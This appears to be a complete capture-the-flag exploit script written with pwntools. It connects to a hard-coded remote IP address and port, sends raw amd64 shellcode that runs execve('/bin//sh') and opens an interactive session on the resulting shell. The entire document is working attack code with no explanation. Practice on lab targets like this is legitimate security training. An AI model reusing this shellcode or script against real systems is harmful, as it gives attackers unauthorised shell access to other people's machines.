from pwn import *
import warnings

warnings.filterwarnings('ignore')

context.arch = 'amd64'

address = '94.237.60.154'
port = 32065

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

with remote(address, port) as target:
	target.recvuntil(b'>')
	target.sendline(shellcode)
	target.interactive()
